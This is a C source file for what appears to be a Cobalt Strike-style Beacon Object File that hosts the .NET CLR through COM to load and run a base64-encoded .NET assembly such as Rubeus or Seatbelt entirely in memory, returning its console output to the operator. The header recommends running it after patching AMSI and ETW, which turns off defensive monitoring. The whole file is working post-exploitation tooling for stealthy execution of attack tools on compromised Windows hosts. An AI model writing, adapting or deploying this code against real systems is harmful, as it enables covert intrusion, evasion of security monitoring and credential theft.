/*
 * execute_assembly.c — In-memory .NET assembly execution via CLR hosting
 *
 * Hosts the .NET 4.x CLR through COM interfaces to load and run a .NET
 * assembly (e.g. Rubeus.exe, Seatbelt.exe) entirely in memory.  The
 * assembly is provided as a base64-encoded blob and its console output
 * is captured and returned through the Beacon API.
 *
 * Recommended workflow:
 *   patchamsi  →  patchetw  →  execute_assembly <base64> "args ..."
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c -Os -fno-asynchronous-unwind-tables \
 *       -fno-ident -fpack-struct=8 -mno-stack-arg-probe              \
 *       -I../shared/include                                           \
 *       -o bin/execute_assembly.x64.o src/execute_assembly.c
 */

#include <windows.h>
#include "beacon_compat.h"

/* ================================================================
 * Win32 API Imports  (BOF convention: DLLNAME$FuncName)
 * ================================================================ */

/* --- KERNEL32 -------------------------------------------------- */
DECLSPEC_IMPORT HMODULE  WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC  WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE,
                                                     LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT HANDLE   WINAPI KERNEL32$GetStdHandle(DWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$SetStdHandle(DWORD, HANDLE);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$PeekNamedPipe(HANDLE, LPVOID, DWORD,
                                                        LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD,
                                                   LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT int      WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD,
                                                              LPCCH, int,
                                                              LPWSTR, int);
DECLSPEC_IMPORT HLOCAL   WINAPI KERNEL32$LocalFree(HLOCAL);

/* --- OLE32 ----------------------------------------------------- */
DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void     WINAPI OLE32$CoUninitialize(void);

/* --- OLEAUT32 -------------------------------------------------- */
DECLSPEC_IMPORT SAFEARRAY* WINAPI OLEAUT32$SafeArrayCreateVector(VARTYPE, LONG, ULONG);
DECLSPEC_IMPORT HRESULT    WINAPI OLEAUT32$SafeArrayPutElement(SAFEARRAY*, LONG*, void*);
DECLSPEC_IMPORT HRESULT    WINAPI OLEAUT32$SafeArrayDestroy(SAFEARRAY*);
DECLSPEC_IMPORT HRESULT    WINAPI OLEAUT32$SafeArrayAccessData(SAFEARRAY*, void**);
DECLSPEC_IMPORT HRESULT    WINAPI OLEAUT32$SafeArrayUnaccessData(SAFEARRAY*);
DECLSPEC_IMPORT BSTR       WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void       WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void       WINAPI OLEAUT32$VariantInit(VARIANTARG*);

/* --- CRYPT32 --------------------------------------------------- */
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptStringToBinaryA(LPCSTR, DWORD, DWORD,
                                                          BYTE*, DWORD*,
                                                          DWORD*, DWORD*);

/* --- SHELL32 --------------------------------------------------- */
DECLSPEC_IMPORT LPWSTR* WINAPI SHELL32$CommandLineToArgvW(LPCWSTR, int*);

/* --- MSVCRT (large-buffer copy) -------------------------------- */
DECLSPEC_IMPORT void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);

/* ================================================================
 * Constants
 * ================================================================ */
#ifndef CRYPT_STRING_BASE64
#define CRYPT_STRING_BASE64 0x00000001
#endif
#ifndef COINIT_MULTITHREADED
#define COINIT_MULTITHREADED 0x0
#endif
#ifndef RPC_E_CHANGED_MODE
#define RPC_E_CHANGED_MODE ((HRESULT)0x80010106L)
#endif

/* ================================================================
 * COM GUIDs  (CLR hosting interfaces — .NET Framework 4.x)
 * ================================================================ */
static const GUID CLSID_CLRMetaHost = {
    0x9280188d, 0x0e8e, 0x4867,
    {0xb3,0x0c, 0x7f,0xa8,0x38,0x84,0xe8,0xde}
};
static const GUID IID_ICLRMetaHost = {
    0xD332DB9E, 0xB9B3, 0x4125,
    {0x82,0x07, 0xA1,0x48,0x84,0xF5,0x32,0x16}
};
static const GUID IID_ICLRRuntimeInfo = {
    0xBD39D1D2, 0xBA2F, 0x486a,
    {0x89,0xB0, 0xB4,0xB0,0xCB,0x46,0x68,0x91}
};
static const GUID CLSID_CorRuntimeHost = {
    0xCB2F6723, 0xAB3A, 0x11d2,
    {0x9C,0x40, 0x00,0xC0,0x4F,0xA3,0x0A,0x3E}
};
static const GUID IID_ICorRuntimeHost = {
    0xCB2F6722, 0xAB3A, 0x11d2,
    {0x9C,0x40, 0x00,0xC0,0x4F,0xA3,0x0A,0x3E}
};
static const GUID IID_AppDomain = {
    0x05F696DC, 0x2B29, 0x3663,
    {0xAD,0x8B, 0xC4,0x38,0x9C,0xF2,0xA7,0x13}
};

/* ================================================================
 * COM Vtable Helpers
 *
 * VT(iface) dereferences the COM object pointer to reach the vtable
 * (array of function pointers).  Each macro casts the entry at the
 * documented vtable index to the correct function-pointer type.
 *
 * Indices are for .NET Framework 4.x mscorlib type library.
 * ================================================================ */
#define VT(iface)  (*((void***)(iface)))

/* IUnknown ------------------------------------------------------- */
#define COM_QI(iface, riid, ppv)                                       \
    ((HRESULT(WINAPI*)(void*, const GUID*, void**))                    \
     (VT(iface)[0]))(iface, riid, ppv)

#define COM_Release(iface)                                             \
    ((ULONG(WINAPI*)(void*))(VT(iface)[2]))(iface)

/* ICLRMetaHost::GetRuntime  — index 3 --------------------------- */
#define MetaHost_GetRuntime(mh, ver, riid, ppv)                        \
    ((HRESULT(WINAPI*)(void*, LPCWSTR, const GUID*, void**))           \
     (VT(mh)[3]))(mh, ver, riid, ppv)

/* ICLRRuntimeInfo::GetInterface  — index 9 ---------------------- */
#define RuntimeInfo_GetInterface(ri, clsid, riid, ppv)                 \
    ((HRESULT(WINAPI*)(void*, const GUID*, const GUID*, void**))       \
     (VT(ri)[9]))(ri, clsid, riid, ppv)

/* ICorRuntimeHost::Start  — index 10 ---------------------------- */
#define CorHost_Start(ch)                                              \
    ((HRESULT(WINAPI*)(void*))(VT(ch)[10]))(ch)

/* ICorRuntimeHost::GetDefaultDomain  — index 13 ----------------- */
#define CorHost_GetDefaultDomain(ch, ppUnk)                            \
    ((HRESULT(WINAPI*)(void*, void**))(VT(ch)[13]))(ch, ppUnk)

/* _AppDomain::Load_3  (byte[])  — index 44 ---------------------- */
#define AppDomain_Load_3(ad, sa, ppAsm)                                \
    ((HRESULT(WINAPI*)(void*, SAFEARRAY*, void**))                     \
     (VT(ad)[44]))(ad, sa, ppAsm)

/* _Assembly::get_EntryPoint  — index 16 ------------------------- */
#define Assembly_get_EntryPoint(a, ppMethod)                            \
    ((HRESULT(WINAPI*)(void*, void**))(VT(a)[16]))(a, ppMethod)

/*
 * _MethodInfo::Invoke_2  — index 37
 *   HRESULT Invoke_2(VARIANT obj, SAFEARRAY* params, VARIANT* retval)
 *
 * VARIANT is 16 bytes; on x64, the compiler passes it via hidden
 * pointer per the Microsoft x64 ABI.  The cast matches the COM
 * vtable entry exactly.
 */
#define MethodInfo_Invoke_2(mi, obj, params, retval)                   \
    ((HRESULT(WINAPI*)(void*, VARIANT, SAFEARRAY*, VARIANT*))          \
     (VT(mi)[37]))(mi, obj, params, retval)

/* ================================================================
 * CLRCreateInstance typedef  (loaded from mscoree.dll at runtime)
 * ================================================================ */
typedef HRESULT (WINAPI *pfnCLRCreateInstance)(const GUID*,
                                               const GUID*,
                                               void**);

/* ================================================================
 * BOF Entry Point
 *
 * Arguments (packed z,z):
 *   1. assembly  — base64-encoded .NET assembly bytes
 *   2. args      — command-line arguments for Main(string[])
 * ================================================================ */
void go(char *args, int args_len)
{
    /* ---- declarations (C89) ------------------------------------ */
    datap               parser;
    char               *b64_assembly;
    char               *cli_args;
    HANDLE              hHeap;
    BYTE               *asmBytes      = NULL;
    DWORD               asmLen         = 0;
    HANDLE              hPipeRead      = NULL;
    HANDLE              hPipeWrite     = NULL;
    HANDLE              hOldStdout     = NULL;
    HANDLE              hOldStderr     = NULL;
    BOOL                bPipeRedirected = FALSE;
    BOOL                bComOwner      = FALSE;
    HRESULT             hr;
    HMODULE             hMscoree;
    pfnCLRCreateInstance fnCreate;
    void               *pMetaHost     = NULL;
    void               *pRuntimeInfo  = NULL;
    void               *pCorHost      = NULL;
    void               *pDomainUnk    = NULL;
    void               *pAppDomain    = NULL;
    void               *pAssembly     = NULL;
    void               *pMethodInfo   = NULL;
    SAFEARRAY          *psaAsm        = NULL;
    SAFEARRAY          *psaArgs       = NULL;
    SAFEARRAY          *psaParams     = NULL;
    SECURITY_ATTRIBUTES saPipe;

    /* ---- parse arguments --------------------------------------- */
    BeaconDataParse(&parser, args, args_len);
    b64_assembly = BeaconDataExtract(&parser, NULL);
    cli_args     = BeaconDataExtract(&parser, NULL);

    if (!b64_assembly || !*b64_assembly) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] No assembly data provided\n");
        return;
    }
    if (!cli_args) cli_args = "";

    hHeap = KERNEL32$GetProcessHeap();

    /* ============================================================
     * Step 1 — Base64-decode the assembly
     * ============================================================ */
    if (!CRYPT32$CryptStringToBinaryA(b64_assembly, 0,
                                       CRYPT_STRING_BASE64,
                                       NULL, &asmLen, NULL, NULL)
        || asmLen == 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] Invalid base64 assembly data\n");
        return;
    }

    asmBytes = (BYTE *)KERNEL32$HeapAlloc(hHeap, 0, asmLen);
    if (!asmBytes) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] HeapAlloc failed (%lu bytes)\n", asmLen);
        return;
    }

    if (!CRYPT32$CryptStringToBinaryA(b64_assembly, 0,
                                       CRYPT_STRING_BASE64,
                                       asmBytes, &asmLen,
                                       NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Base64 decode failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Assembly decoded: %lu bytes\n", asmLen);

    /* ============================================================
     * Step 2 — Create an anonymous pipe for stdout/stderr capture
     *
     * NOTE: The pipe buffer (1 MB) limits how much output the
     * assembly can produce before Invoke_2 returns.  If exceeded,
     * the assembly will block.  Use /outfile or similar flags on
     * verbose tools to keep console output small.
     * ============================================================ */
    saPipe.nLength              = sizeof(saPipe);
    saPipe.lpSecurityDescriptor = NULL;
    saPipe.bInheritHandle       = TRUE;

    if (!KERNEL32$CreatePipe(&hPipeRead, &hPipeWrite,
                              &saPipe, 1024 * 1024)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] CreatePipe failed: %lu\n",
                     KERNEL32$GetLastError());
        goto cleanup;
    }

    hOldStdout = KERNEL32$GetStdHandle(STD_OUTPUT_HANDLE);
    hOldStderr = KERNEL32$GetStdHandle(STD_ERROR_HANDLE);
    KERNEL32$SetStdHandle(STD_OUTPUT_HANDLE, hPipeWrite);
    KERNEL32$SetStdHandle(STD_ERROR_HANDLE,  hPipeWrite);
    bPipeRedirected = TRUE;

    /* ============================================================
     * Step 3 — Initialize COM
     * ============================================================ */
    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr == S_OK || hr == S_FALSE) {
        bComOwner = TRUE;          /* we must CoUninitialize later */
    } else if (hr != RPC_E_CHANGED_MODE) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] CoInitializeEx failed: 0x%08lX\n", hr);
        goto cleanup;
    }
    /* RPC_E_CHANGED_MODE is fine — COM is already up on this thread */

    /* ============================================================
     * Step 4 — Load mscoree.dll and get CLRCreateInstance
     * ============================================================ */
    hMscoree = KERNEL32$LoadLibraryA("mscoree.dll");
    if (!hMscoree) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] Failed to load mscoree.dll "
                     "(.NET Framework not installed?)\n");
        goto cleanup;
    }

    fnCreate = (pfnCLRCreateInstance)
        KERNEL32$GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCreate) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] CLRCreateInstance not found — "
                     ".NET 4.x required\n");
        goto cleanup;
    }

    hr = fnCreate(&CLSID_CLRMetaHost,
                  &IID_ICLRMetaHost, &pMetaHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] CLRCreateInstance failed: 0x%08lX\n", hr);
        goto cleanup;
    }

    /* ============================================================
     * Step 5 — Get the v4.0.30319 runtime
     * ============================================================ */
    hr = MetaHost_GetRuntime(pMetaHost, L"v4.0.30319",
                             &IID_ICLRRuntimeInfo, &pRuntimeInfo);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] GetRuntime(v4.0.30319) failed: 0x%08lX\n",
                     hr);
        goto cleanup;
    }

    /* ============================================================
     * Step 6 — Get ICorRuntimeHost interface
     * ============================================================ */
    hr = RuntimeInfo_GetInterface(pRuntimeInfo,
                                  &CLSID_CorRuntimeHost,
                                  &IID_ICorRuntimeHost,
                                  &pCorHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] GetInterface(ICorRuntimeHost) "
                     "failed: 0x%08lX\n", hr);
        goto cleanup;
    }

    /* ============================================================
     * Step 7 — Start the CLR  (S_FALSE = already running, OK)
     * ============================================================ */
    hr = CorHost_Start(pCorHost);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] ICorRuntimeHost::Start "
                     "failed: 0x%08lX\n", hr);
        goto cleanup;
    }

    /* ============================================================
     * Step 8 — Get the default AppDomain
     * ============================================================ */
    hr = CorHost_GetDefaultDomain(pCorHost, &pDomainUnk);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] GetDefaultDomain failed: 0x%08lX\n", hr);
        goto cleanup;
    }

    hr = COM_QI(pDomainUnk, &IID_AppDomain, &pAppDomain);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] QI(_AppDomain) failed: 0x%08lX\n", hr);
        goto cleanup;
    }

    /* ============================================================
     * Step 9 — Load the assembly from its raw bytes
     * ============================================================ */
    psaAsm = OLEAUT32$SafeArrayCreateVector(VT_UI1, 0, asmLen);
    if (!psaAsm) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] SafeArrayCreateVector(VT_UI1) failed\n");
        goto cleanup;
    }

    {
        void *pvData = NULL;
        hr = OLEAUT32$SafeArrayAccessData(psaAsm, &pvData);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] SafeArrayAccessData failed: "
                         "0x%08lX\n", hr);
            goto cleanup;
        }
        MSVCRT$memcpy(pvData, asmBytes, asmLen);
        OLEAUT32$SafeArrayUnaccessData(psaAsm);
    }

    hr = AppDomain_Load_3(pAppDomain, psaAsm, &pAssembly);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] AppDomain.Load failed: 0x%08lX\n", hr);
        BeaconPrintf(CALLBACK_ERROR,
                     "    Ensure the assembly targets "
                     ".NET Framework 4.x\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Assembly loaded into AppDomain\n");

    /* ============================================================
     * Step 10 — Get the entry point (Main)
     * ============================================================ */
    hr = Assembly_get_EntryPoint(pAssembly, &pMethodInfo);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[!] get_EntryPoint failed: 0x%08lX\n", hr);
        BeaconPrintf(CALLBACK_ERROR,
                     "    Assembly may lack a Main() method\n");
        goto cleanup;
    }

    /* ============================================================
     * Step 11 — Build arguments and invoke Main(string[] args)
     * ============================================================ */
    {
        int      argc  = 0;
        LPWSTR  *argv  = NULL;
        VARIANT  vtArgs;
        VARIANT  vtEmpty;
        VARIANT  vtResult;
        LONG     idx;
        int      i;

        /* -- split the command line into individual args --------- */
        if (cli_args[0] != '\0') {
            int    wlen;
            LPWSTR wArgs;

            wlen  = KERNEL32$MultiByteToWideChar(
                        CP_ACP, 0, cli_args, -1, NULL, 0);
            wArgs = (LPWSTR)KERNEL32$HeapAlloc(
                        hHeap, 0, (SIZE_T)wlen * sizeof(WCHAR));
            if (wArgs) {
                KERNEL32$MultiByteToWideChar(
                    CP_ACP, 0, cli_args, -1, wArgs, wlen);
                argv = SHELL32$CommandLineToArgvW(wArgs, &argc);
                KERNEL32$HeapFree(hHeap, 0, wArgs);
            }
        }

        /* -- SAFEARRAY(VT_BSTR)  =  string[] -------------------- */
        psaArgs = OLEAUT32$SafeArrayCreateVector(
                      VT_BSTR, 0, (ULONG)argc);
        if (!psaArgs) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] SafeArrayCreateVector(VT_BSTR) "
                         "failed\n");
            if (argv) KERNEL32$LocalFree(argv);
            goto cleanup;
        }

        for (i = 0; i < argc; i++) {
            BSTR bstr = OLEAUT32$SysAllocString(argv[i]);
            idx = (LONG)i;
            OLEAUT32$SafeArrayPutElement(psaArgs, &idx, bstr);
            OLEAUT32$SysFreeString(bstr);   /* PutElement copies */
        }

        if (argv) {
            KERNEL32$LocalFree(argv);
            argv = NULL;
        }

        /* -- wrap string[] in a VARIANT(VT_ARRAY|VT_BSTR) ------- */
        OLEAUT32$VariantInit(&vtArgs);
        vtArgs.vt     = VT_ARRAY | VT_BSTR;
        vtArgs.parray = psaArgs;

        /* -- SAFEARRAY(VT_VARIANT) with 1 element for Invoke_2 -- */
        psaParams = OLEAUT32$SafeArrayCreateVector(
                        VT_VARIANT, 0, 1);
        if (!psaParams) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] SafeArrayCreateVector(VT_VARIANT) "
                         "failed\n");
            goto cleanup;
        }

        idx = 0;
        OLEAUT32$SafeArrayPutElement(psaParams, &idx, &vtArgs);
        /*
         * SafeArrayPutElement deep-copies the VARIANT (including
         * the inner BSTR SAFEARRAY).  psaArgs is still separately
         * owned and freed in cleanup.
         */

        /* -- invoke Main(string[] args) ------------------------- */
        OLEAUT32$VariantInit(&vtEmpty);     /* VT_EMPTY — static */
        OLEAUT32$VariantInit(&vtResult);

        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] Invoking entry point ...\n");

        hr = MethodInfo_Invoke_2(pMethodInfo, vtEmpty,
                                  psaParams, &vtResult);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[!] Invoke failed: 0x%08lX\n", hr);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[+] Assembly executed successfully\n");
        }
    }

    /* ============================================================
     * Cleanup — release resources in reverse order
     * ============================================================ */
cleanup:
    /* ---- restore stdout / stderr ---- */
    if (bPipeRedirected) {
        KERNEL32$SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
        KERNEL32$SetStdHandle(STD_ERROR_HANDLE,  hOldStderr);
    }

    /* ---- close the write end so reads see EOF ---- */
    if (hPipeWrite) {
        KERNEL32$CloseHandle(hPipeWrite);
        hPipeWrite = NULL;
    }

    /* ---- drain captured output ---- */
    if (hPipeRead) {
        char  readBuf[4096];
        DWORD dwRead, dwAvail;

        while (KERNEL32$PeekNamedPipe(hPipeRead, NULL, 0,
                                       NULL, &dwAvail, NULL)
               && dwAvail > 0)
        {
            DWORD toRead = (dwAvail < sizeof(readBuf) - 1)
                               ? dwAvail
                               : (DWORD)(sizeof(readBuf) - 1);

            if (KERNEL32$ReadFile(hPipeRead, readBuf,
                                  toRead, &dwRead, NULL)
                && dwRead > 0)
            {
                readBuf[dwRead] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%s", readBuf);
            } else {
                break;
            }
        }

        KERNEL32$CloseHandle(hPipeRead);
        hPipeRead = NULL;
    }

    /* ---- release COM interfaces (reverse order) ---- */
    if (pMethodInfo)  COM_Release(pMethodInfo);
    if (pAssembly)    COM_Release(pAssembly);
    if (pAppDomain)   COM_Release(pAppDomain);
    if (pDomainUnk)   COM_Release(pDomainUnk);
    if (pCorHost)     COM_Release(pCorHost);
    if (pRuntimeInfo) COM_Release(pRuntimeInfo);
    if (pMetaHost)    COM_Release(pMetaHost);

    /* ---- destroy SAFEARRAYs ---- */
    if (psaParams)    OLEAUT32$SafeArrayDestroy(psaParams);
    if (psaArgs)      OLEAUT32$SafeArrayDestroy(psaArgs);
    if (psaAsm)       OLEAUT32$SafeArrayDestroy(psaAsm);

    /* ---- COM teardown ---- */
    if (bComOwner)    OLE32$CoUninitialize();

    /* ---- free heap memory ---- */
    if (asmBytes)     KERNEL32$HeapFree(hHeap, 0, asmBytes);
}
